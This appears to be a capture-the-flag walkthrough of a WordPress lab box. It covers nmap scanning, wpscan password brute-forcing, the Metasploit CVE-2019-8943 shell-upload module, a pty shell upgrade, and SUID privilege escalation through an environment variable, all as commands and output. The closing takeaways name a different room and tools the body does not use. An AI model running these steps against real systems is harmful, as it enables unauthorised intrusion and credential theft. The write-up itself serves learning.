- **Difficulty: Medium**
- **Target IP: 10.10.201.38**
---
### 1. Reconnaissance

**`nmap` scan:**

 - `nmap -O -sV 10.10.201.38`

**Results:**

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

### 2. Web Enumeration

#### Access via hostname:

- Target uses virtual hosts, so need to map `<Target_IP>` to `blog.thm` in `/etc/hosts`

- Navigating to `http://blog.thm` presents a blog made using `wordpress`

#### Usernames Discovered:

- After some searching around the blog, we find it is authored by `Billy Joel` with username `bjoel` from the URL `blog.thm/author/bjoel`

- Furthermore, Billy's mom is also a user. `Karen Wheeler` with username `kwheel` found in the URL `blog.thm/author/kwheel`

#### `wpscan`

- Nothing too interesting from `wpscan --url blog.thm --enumerate vp`

- Next we try brute-forcing passwords for both `bjoel` and `kwheel` using `rockyou.txt`

```bash
wpscan --url blog.thm -U bjoel -P /usr/share/wordlists/rockyou.txt
wpscan --url blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt
```

- We find user `kwheel` password and login using `blog.thm/wp-login.php`

### 3. Exploit

- After a little recon, we find some corrupted image files within the media section

- Searched on [exploit-db](https://www.exploit-db.com) for relevant WordPress vulnerabilites

	- `WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)` looks promising
	- This is also known as `CVE: 2019-8943, 2019-8942` 

#### `metasploit`

- Hop onto `msfconsole` and search for and use `cve-2019-8943` 

- `show options` lets us see that the options `RHOSTS`, `LHOST`, `USERNAME`, and `PASSWORD` are required. (Use the login creds we brute forced)

### 4. Initial Access

#### `meterpreter` Shell Established

- Running `getuid` returns:

```bash
Server username: www-data
```

- Run the `shell` command in `meterpreter`  session to create a shell

- Upgrade the shell with python:

```python
python -c "import pty;pty.spawn ('/bin/bash')"
```

- Using `ls` shows us a file `wp-config.php` that we can check for credentials

```bash
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', '[REDACTED]');
```

### 5. Privilege Escalation

- Find commands with the `SUID` bit set:

```bash
find / -perm -4000 2>/dev/null
```

- `find /` — searches starting from the root directory (`/`) recursively through all files and directories

- `-perm -4000` — this tells `find` to look for files with the **SUID** bit set. The `4000` is the octal permission for the SUID bit

- `2>/dev/null` — redirects error messages (like "Permission denied") to `/dev/null` so they don’t clutter your output

- `/usr/sbin/checker` is our key here

- `file /usr/sbin/checker` returns:

```bash
setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped
```

- `ltrace /usr/sbin/checker` returns:

```bash
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

- This executable is checking the env variable to see if we are an admin or not

#### Exploiting `checker` 

- We can try running the binary after setting the environment variable:

```bash
export admin=1
/usr/sbin/checker
```

- This grants us `root` !

### 6. Post Exploitation

- First order of business is to find the `user.txt` flag

- Check the default home directory `/home/bjoel`, as it is commonly contains the `user.txt` flag 

- There is a `user.txt` in here, however:

```text
You won't find what you're looking for here.
```

- Use `find / -name user.txt` to locate the actual `user.txt` flag:

```bash
/home/bjoel/user.txt
/media/usb/user.txt <- The correct path
```

- Lastly, `cat` the `root.txt` file:

```bash
cat /root/root.txt
```


--- 

#### Final Takeaways - TryHackMe: Lookup

- **Thorough enumeration** is key — subdomains, author pages, and usernames can all provide footholds.

- The `wpscan` tool was instrumental for discovering usernames and plugin vulnerabilities.

- Brute-forcing `wp-login.php` with a good wordlist (like `rockyou.txt`) + `hydra` cracked a real user password.

- File upload access via WordPress dashboard allowed a **reverse shell** through a malicious PHP payload.

- **`meterpreter` > `shell` > upgraded with Python pseudo-terminal** for improved interactivity.

- Access to `wp-config.php` revealed MySQL database credentials — useful for lateral movement or full application compromise.

- `find / -perm -4000 2>/dev/null` helped identify the **SUID binary** `/usr/sbin/checker` for privilege escalation.

- `ltrace` exposed that the binary was checking for an `admin` environment variable.

	- Set the variable with `export admin=1` → rerunning the binary → escalated to **root**.

---

### 🧰 Tool Reference Table

| Tool          | Purpose                                                                                  |
|---------------|------------------------------------------------------------------------------------------|
| `nmap`        | Network scanning and service enumeration                                                 |
| `wpscan`      | WordPress vulnerability and user enumeration; brute-force login attempts                 |
| `rockyou.txt` | Common password wordlist used for brute-forcing credentials                             |
| `msfconsole` / `Metasploit` | Exploitation framework used to run CVE-2019-8943 module                             |
| `meterpreter` | Post-exploitation shell provided by Metasploit                                          |
| `ltrace`      | Traces library calls to inspect how a binary interacts with its environment              |
| `find`        | Used to locate files (e.g., with SUID bit or named `user.txt`)                           |
| `export`      | Sets environment variables (used to escalate privileges with `checker`)                  |
| `python`      | Used to upgrade shell for better TTY handling                                           |
[[CTF Notes]]



